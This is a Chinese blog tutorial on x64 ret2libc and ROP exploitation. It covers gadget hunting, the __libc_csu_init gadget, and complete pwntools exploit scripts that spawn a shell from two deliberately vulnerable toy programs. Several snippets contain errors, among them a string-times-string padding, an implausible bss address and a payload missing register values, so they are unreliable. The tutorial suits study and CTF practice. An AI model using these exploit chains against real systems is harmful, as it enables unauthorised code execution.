<h2 align=center>关于libc与rop的思考</h2>



###  那些奇妙的组合  

---

&emsp;&emsp;这两天读了一些书，学了一些新的知识，关于libc我们比较熟悉的是通过**write()** **puts()**等函数来泄漏**system()**和**/bin/sh**的实际地址，然后通过缓冲区溢出来进行利用，这是常见而基础的ret2libc。  
&emsp;&emsp;但是我们来想想这几种情况，假如程序是64位那么我们如何将参数传入函数，假如我们没有拿到libc.so那么我们如何计算偏移，一般来说处理这中情况往往需要一些骚操作，以rop来实现libc泄漏往往是绕不过的。举个简单例子，在x86中write()传参是这样的：  
```python
payload = 'a' * 0x80 + p32(write_got) + p32(vuln) + p32(0) + p32(address_to_leak) + p32(8)
```
&emsp;&emsp;通过调用write函数来泄漏address_to_leak的真实地址，一般我们会选择write_got自己或者libc_start_main_got来进行泄漏，因为 **延迟绑定** 的原因，只有被调用过的函数，他的got表里才会储存该函数在内存中的实际地址。  

> 关于这一部分大家可以读一度《程序员的自我修养这本书》，还有下面这篇文章：
> [got&plt](https://www.freebuf.com/articles/system/135685.html)  
> 详细的介绍了got与plt以及延迟绑定的问题  

&emsp;&emsp;我们现在就来总结一下如何处理x64的libc泄漏问题。  

#### 1.直接寻找可用于传参的budget  
&emsp;&emsp;既然要泄漏地址，那么必然要使用write()与puts()等函数，这个过程就涉及到参数的传递，不像x86那样可以用栈传递参数，x64拥有更多的寄存器，所以会优先选择使用寄存器来传递参数，关于寄存器我们需要将一下传参规则，先看下图：  

![register](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/register.png?raw=true)

&emsp;&emsp;我们可以看到64位的程序的参数在6个以内时会优先调用寄存器，而使用的顺序如下：  

```at&t
	%rdi => arg1
	
	%rsi => arg2
	
	%rdx => arg3
	
	%rcx => arg4
	
	%r8 => arg5
	
	%r9 => arg6
```

&emsp;&emsp;而 ***%rax*** 依旧用于保存返回值。知道这些储备知识以后，我们来开一个使用gadgets来控制程序的例子。  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void systemaddr()
{
    void* handle = dlopen("libc.so.6", RTLD_LAZY);
    printf("%p\n",dlsym(handle,"system"));
    fflush(stdout);
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    systemaddr();
    write(1, "Hello, World\n", 13);
    vulnerable_function();
}
```
> gcc -fno-stack-procter -no-pie -o rop_libc rop_libc1

&emsp;&emsp;我们首先可以看到一个明显的缓冲区溢出，而且程序会自动输出system()在内存中的实际地址，这个时候我们可以想到只需要拥有 **"/bin/sh"** 就可以走上人生巅峰，这个时候我们考虑使用gadgets来将 **"/bin/sh"** 的地址传入 **rdi**。ok，用ROPgadget来搜索一波：  

```shell
ROPgadget 	--binary rop_libc1  --only "pop|ret"
====================================================
0x0000000000001294 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001296 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001298 : pop r14 ; pop r15 ; ret
0x000000000000129a : pop r15 ; ret
0x0000000000001293 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001297 : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000000116f : pop rbp ; ret
0x000000000000129b : pop rdi ; ret
0x0000000000001299 : pop rsi ; pop r15 ; ret
0x0000000000001295 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001016 : ret
0x0000000000001072 : ret 0x2f
0x000000000000119a : ret 0xfffe
```
&emsp;&emsp;我们发现结果并不理想，由于这个程序太小了，里面竟然没有 **pop rdi ; ret** 这条指令，那么我们只好换个思路，为什么不直接使用libc.so里的gadgets呢？灵机一动之后，我们想到可用使用write()来泄漏libc.so里的指令地址，话不多说，先搜一下symbols地址：  

```shell
ROPgadget --binary rop_libc --only "pop|ret" 
=====================================================
0x000000000002456f : pop rdi ; pop rbp ; ret
0x0000000000023a5f : pop rdi ; ret
```
&emsp;&emsp;果然命中注定的那个它出现了，**0x23a5f：pop rdi ; ret ** 就是我们想要的gadgets，我们可以构造rop链了。  

```python
payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)
```

&emsp;&emsp;但同时考虑到我们只需要执行system一次，所以似乎gadgets不含有ret也可以，那么我们的选择又多了一些：  

```shell  
ROPgadget --binary rop_libc --only "pop|call"
====================================================
0x00000000000bad0d : call qword ptr [rdi]
0x0000000000027225 : call rdi
0x00000000000f982b : pop rax ; pop rdi ; call rax
0x00000000000f982c : pop rdi ; call rax
```

&emsp;&emsp;这时候我们看到了 **0x00f982b : pop rax ; pop rdi ; call rax** 这行指令应该也是可以的，我们只需要构造payload如下：  

```python
payload = 'a' * 0x80 + 'b' * 8 + p64(pop_pop_call) + p64(system_addr) + p64(bin_sh)
```

&emsp;&emsp;此时system_addr被传入rax，bin_sh被传入rdi，最后调用call rax实现exploit，所以两条ROP都可以完成一次优雅的攻击，最终的exp如下：  

```python
from pwn import *

sh = process('./rop_libc')

libc = ELF('./libc.so')

vuln_addr = 0x000011db

system_addr_str = sh.recvuntil("\n")
system_addr = int(system_addr_str,16)
print "system_addr= " + hex(system_addr)

pop_pop_call_offset = 0x00000000000f982b - libc.symbols['system']
print "pop_offset= " + hex(pop_pop_call_offset)

bin_sh_offset = 0x0000000000181519 - libc.symbols['system'] # libc.search('/bin/sh').next()
print "bin_sh_offset= " + hex(bin_sh_offset)

pop_pop_call_addr = system_addr + pop_pop_call_offset
print "pop_addr= " + hex(pop_pop_call_addr)
#pop_pop_call_addr = system_addr + pop_pop_call_offset
#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)

bin_sh = system_addr + bin_sh_offset
print "bin_sh= " + hex(bin_sh)

payload = 'a'*0x88 +  p64(pop_pop_call_addr) + p64(system_addr) + p64(bin_sh)
#payload = "a" * 0x80 + 'b' * '8' + p64(pop_ret_addr) + p64(bin_sh) + p64(system_addr)

sh.sendline(payload) 

sh.interactive()
```

![result](https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/rop_libc.png?raw=true)  

#### 2.通用gadgets  

&emsp;&emsp;假如我们出现了更艰难的情况，我们需要传入更多的参数进去，比如write(),这时候要怎么办？我们查一下libc.so发现什么都没有，有点难受：  
```shell
0x0000000000106ab4 : pop r10 ; ret
0x0000000000024568 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023a58 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000006f529 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000002fc29 : pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000396f5 : pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000023f85 : pop r12 ; pop r13 ; ret
0x00000000000b5399 : pop r12 ; pop r14 ; ret
0x00000000000c513d : pop r12 ; pop rbp ; ret
0x0000000000024209 : pop r12 ; ret
0x000000000002456a : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000023a5a : pop r13 ; pop r14 ; pop r15 ; ret
0x000000000006f52b : pop r13 ; pop r14 ; pop rbp ; ret
0x000000000002fc2b : pop r13 ; pop r14 ; ret
0x00000000000396f7 : pop r13 ; pop rbp ; ret
0x0000000000023f87 : pop r13 ; ret
```

&emsp;&emsp;不太全但是可以发现几乎没有关于rdi等等有关参数的寄存器，这个时候我们就要采取一些骚办法.  

> __libc_csu_init  

&emsp;&emsp;这个函数在大部分程序初始化的时候都会出现，我们首先来看一下这个函数的源码：  

```shell
objdump -d rop_libc
====================================================

0000000000001240 <__libc_csu_init>:
    1240:       41 57                   push   %r15
    1242:       49 89 d7                mov    %rdx,%r15
    1245:       41 56                   push   %r14
    1247:       49 89 f6                mov    %rsi,%r14
    124a:       41 55                   push   %r13
    124c:       41 89 fd                mov    %edi,%r13d
    124f:       41 54                   push   %r12
    1251:       4c 8d 25 80 2b 00 00    lea    0x2b80(%rip),%r12        # 3dd8 <__frame_dummy_init_array_entry>
						
						..........
						#以下是关键
    #gadget2
    1278:       4c 89 fa                mov    %r15,%rdx
    127b:       4c 89 f6                mov    %r14,%rsi
    127e:       44 89 ef                mov    %r13d,%edi
    1281:       41 ff 14 dc             callq  *(%r12,%rbx,8)
    1285:       48 83 c3 01             add    $0x1,%rbx
    1289:       48 39 dd                cmp    %rbx,%rbp
    128c:       75 ea                   jne    1278 <__libc_csu_init+0x38>
    128e:       48 83 c4 08             add    $0x8,%rsp
   
   #gadget1
   1292:       5b                      pop    %rbx
   1293:       5d                      pop    %rbp
   1294:       41 5c                   pop    %r12
   1296:       41 5d                   pop    %r13
   1298:       41 5e                   pop    %r14
   129a:       41 5f                   pop    %r15
   129c:       c3                      retq   #此处构造一些padding(7*8=56byte)就可以返回了
```

&emsp;&emsp;首先我们来看一下gadgets1，pop了一堆东西进到寄存器里，然后控制ret到gadget2,此时我们便可以看出其中的玄机，gadget1中pop进寄存器的值竟然被传进了我们梦寐以求的rdi rsi rdx 三个参数寄存器，然后接下来 `callq *(%r12,%rbx,8)` 会调用 **[$r12 + rbx*8]** 处的函数,之后进行 rbx += 1,然后比较rbx与rbp的值，如果想等那么就继续向下进行，并且ret到我们想要继续执行的位置。到这，我就可以开始思考如何给gadget1传参数了，反复思索后：  

```php
$rbx = 0

$rbp = 1

$r12 = callee function

$r13 = arg1			$r14 = arg2				$r15 = arg3
```
> 这里需要注意的是需要构造56个padding，因为进行了6次pop和一次ret，使得rsp增大了56bytes。  

&emsp;&emsp;这个时候我们精心设计的rop链就可以执行传递多个参数的复杂操作了。

&emsp;&emsp;下面我们来看一道题：  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```

&emsp;&emsp;乍一看除了write()和read()啥也没有，可以想到应该是libc泄漏，搜了一波发现没啥好用的gadgets，行吧，__libc_csu_init走起。由于write()函数被调用过，所以我们考虑根据write()来计算偏移：  

&emsp;&emsp;我们先构造payload1,利用write()函数来泄漏write自己在内存里的位置，然后返回到程序里，继续覆盖栈上的数据，直到回到main函数来继续进行后续操作：  
```python
#get the address of write
payload1 = 'a'*0x88  + p64(0x4011e2) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)
payload1 += p64(0x4011c8) + 'd' * 56 + p64(main)
```

&emsp;&emsp;当我们收到write的地址后，我们便能够计算出system()在内存中的地址了。我们便构造payload2使用read()函数来将算出的system()与/bin/sh写入bss段：  

```python
#get the address of system and bin_sh
payload2 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(read_got) + p64(1) + p64(bss) + p64(16) + p64(0x4011c8) + 'd'*56 + p64(main)
```

最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。 

```python
#activate the system("/bin/sh")
payload3 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss) + p64(bss+8) + p64(0x4011c8) + 'd' *56 + p64(main)
```

&emsp;&emsp;最终的exp如下：  

```python
from pwn import *

#r12 = ret_addr

#r13 = rdi = arg1   r14 = rsi = arg2    r15 = rdx = arg3

#rbx = 0    rbp = 1

sh = process('./rop_libc1')

elf = ELF('./rop_libc1')
libc = ELF('./libc.so')

main = 0x401153
bss = 0x00000008
read_got = 0x404020

write_got = elf.got['write']
print "write_got= " + hex(write_got)
write_libc = libc.symbols['write']
print "write_libc= " + hex(write_libc)
system_libc = libc.symbols['system']
print "system_libc= " + hex(system_libc)
bin_sh_libc = libc.search('/bin/sh').next()
print "bin_sh_libc= " + hex(bin_sh_libc)

#get the address of write
payload1 = 'a'*0x88  + p64(0x4011e2) + p64(0) + p64(1) + p64(write_got) + p64(1) + p64(write_got) + p64(8)
payload1 += p64(0x4011c8) + 'd' * 56 + p64(main)

sh.recvuntil("Hello, World\n")
sh.sendline(payload1)
sleep(0.5)

write_addr = u64(sh.recv(8))
print "write_addr= " + hex(write_addr)
sleep(0.5)

#get the address of system and bin_sh
payload2 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(read_got) + p64(1) + p64(bss) + p64(16) + p64(0x4011c8) + 'd'*56 + p64(main)
sh.sendline(payload2)
sh.send(p64(system_libc + write_addr - write_libc))
sh.send("/bin/sh\0")
sleep(0.5)
sh.recvuntil("Hello, World\n")

#activate the system("/bin/sh")
payload3 = 'a'*0x88 + p64(0x4011e2) + p64(0) + p64(1) + p64(bss) + p64(bss+8) + p64(0x4011c8) + 'd' *56 + p64(main)
sh.sendline(payload3)
sh.interactive()
```
&emsp;&emsp;至此，一个华丽的利用已经完成了.  

> 以上是对x64libc泄漏的处理方式

#### 书山又路勤为径,学海无涯苦做舟










